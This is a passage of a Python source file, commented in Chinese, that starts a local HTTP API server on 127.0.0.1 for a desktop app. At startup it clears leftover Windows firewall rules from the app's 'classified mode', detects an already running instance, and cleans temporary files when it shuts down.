    allow_reuse_address = False
    # 限制最大并发请求线程数，防止过多线程导致系统卡顿
    max_children = 4
    # 请求队列长度
    request_queue_size = 8

    def process_request_thread(self, request, client_address):
        """重写：设置线程优先级为较低，避免与 Qt 主线程争抢 CPU"""
        try:
            import platform
            if platform.system() == "Windows":
                try:
                    import ctypes
                    # THREAD_PRIORITY_BELOW_NORMAL = -1
                    ctypes.windll.kernel32.SetThreadPriority(
                        ctypes.windll.kernel32.GetCurrentThread(),
                        -1
                    )
                except Exception:
                    pass
        except Exception:
            pass
        super().process_request_thread(request, client_address)


def start_server(port=8765):
    # C-1 修复（产品专家）：**启动时**也要把设置页的前缀开关注入识别链路。
    # 原来 _apply_prefix_config() 只在"保存设置"里调用 → 重启后 _ACTIVE_PREFIXES
    # 回到 None → 退回内置默认 17 条正则：用户关掉的 ISO/TB/Q 又全部开始识别，
    # 而设置页文案承诺的是"保存后立即生效，无需重启"。
    # 症状：跨重启后识别结果变化 → 用户认为"程序漏识别/乱识别"。
    try:
        _prefix_n = _apply_prefix_config()
        log_print(f"[启动] 已应用前缀开关配置，生效前缀 {_prefix_n} 个", "INIT")
    except Exception as _pe:
        log_print(f"[启动] 应用前缀开关配置失败: {_pe}", "WARN")
    # 启动时清理上次运行可能残留的涉密模式状态（防止崩溃/卡退后残留挡网）
    # 涉密模式是运行时状态（关闭程序自动退出），因此启动时：
    #   - 若当前确实处于涉密状态（环境变量/标志文件），则保留规则
    #   - 否则（默认，或上次崩溃残留的持久化标记），清理残留规则并重置标记
    try:
        _settings_path = _user_data(".app_settings.json")
        _persisted_classified = False
        if os.path.exists(_settings_path):
            with open(_settings_path, "r", encoding="utf-8") as _sf:
                _sd = json.load(_sf)
            _persisted_classified = bool(_sd.get("classifiedMode", False))

        # 仅当既非真实涉密状态、持久化标记也非 true 时才清理。
        # 注：若持久化标记残留 true 但实际并未处于涉密（崩溃残留），
        #     我们仍清理规则，因为涉密模式是运行时状态、不应跨会话保持。
        if not is_classified():
            # 1) 清理残留的 Windows 防火墙阻止规则
            from core.security_config import remove_windows_firewall_rules as _remove_wf
            _remove_wf()
            # 2) 清理残留的提权标志文件（防止下次启动误判为涉密模式）
            try:
                from core.security_config import _pending_flag_path as _get_flag_path
                _flag_path = _get_flag_path()
                if os.path.exists(_flag_path):
                    os.remove(_flag_path)
                    log_print("已清理残留的涉密提权标志文件", "INIT")
            except Exception:
                pass
            # 3) 若持久化标记残留 true（上次涉密崩溃/异常退出），重置为 false
            if _persisted_classified:
                try:
                    _sd["classifiedMode"] = False
                    with open(_settings_path, "w", encoding="utf-8") as _wf:
                        json.dump(_sd, _wf, ensure_ascii=False, indent=2)
                    log_print("已重置残留的涉密持久化标记", "INIT")
                except Exception:
                    pass
            log_print("启动时清理残留防火墙规则完成", "INIT")
    except Exception:
        pass

    # 残留规则自检：上面那次清理在没有管理员权限时会静默失败（remove_windows_firewall_rules
    # 直接 return），而残留的「出站阻断」规则会把 127.0.0.1 回环一起挡掉 ——
    # 界面就会加载失败并显示"127.0.0.1 拒绝访问"，用户完全找不到原因。
    # 注意：这一步要起一次 PowerShell（实测约 1.5~2 秒），**必须放到后台线程**，
    # 否则会卡在绑定端口之前，界面要多等两秒才出得来。它只影响提示与状态展示，
    # 不影响服务本身，放后台没有副作用。
    threading.Thread(target=_residual_rules_selfcheck, daemon=True).start()

    # 端口占用处理：原先 allow_reuse_address=True 会让第二个实例"偷"走端口，
    # 变成两个后端抢答，界面时好时坏。现在改为：能探测到已有实例就复用它，
    # 否则（残留 TIME_WAIT 等）短暂重试，最后才报错。
    server = None
    last_err = None
    for attempt in range(6):
        try:
            server = ThreadedHTTPServer(("127.0.0.1", port), APIHandler)
            break
        except OSError as e:
            last_err = e
            if _probe_existing_instance(port):
                log_print(f"端口 {port} 上已有本程序的后端在运行，本次直接复用（不再重复启动）", "INIT")
                return None
            if attempt < 5:
                time.sleep(0.6)
    if server is None:
        raise RuntimeError(
            f"无法在 127.0.0.1:{port} 启动本地服务（{last_err}）。"
            f"请关闭其它正在运行的本程序窗口后重试。")
    log_print(f"HTTP API 服务器启动在 http://127.0.0.1:{port}", "INIT")
    return server


def _residual_rules_selfcheck():
    """启动时的残留防火墙规则自检。

    放在后台线程里执行：要起一次 PowerShell（约 1.5~2 秒），
    若放在绑定端口之前会让界面白等两秒。
    """
    try:
        from core.security_config import detect_residual_rules, _check_admin
        _res = detect_residual_rules()
        if not _res.get("present"):
            return
        if _check_admin():
            log_print(f"检测到 {_res['count']} 条残留防火墙规则，已尝试清理", "WARN")
        else:
            log_print(
                f"[注意] 检测到 {_res['count']} 条上次遗留的 Windows 防火墙规则，"
                f"但当前没有管理员权限、无法清理。\n"
                f"   如果界面显示不出来（127.0.0.1 拒绝访问），请右键以管理员身份运行本程序，"
                f"或在「设置 - 安全」里点「以管理员身份重启」。", "ERROR")
    except Exception:
        pass


def _probe_existing_instance(port: int, timeout: float = 1.5) -> bool:
    """探测 port 上是否已运行本程序的后端（用 /api/status 应答判断）"""
    import socket as _socket
    try:
        with _socket.create_connection(("127.0.0.1", port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(b"GET /api/status HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
            data = s.recv(512)
        text = (data or b"").decode("utf-8", "ignore")
        return '"status"' in text and '"ok"' in text
    except Exception:
        return False


if __name__ == "__main__":
    server = start_server()
    if server is None:
        # 已有实例在跑（start_server 复用它）。此时**绝不能**执行清理：
        # 临时/导出目录是共用的，清理会把正在运行那个实例的上传副本、
        # 导出文件、待导入清单全删掉。
        log_print("已有实例在运行，本进程直接退出", "INIT")
        raise SystemExit(0)
    try:
        # 自动打开默认浏览器
        import webbrowser
        webbrowser.open("http://127.0.0.1:8765")
        server.serve_forever()
    except KeyboardInterrupt:
        log_print("服务器关闭", "INIT")
        server.shutdown()
    finally:
        # 关闭时清理临时缓存
        _cleanup_temp_dirs()
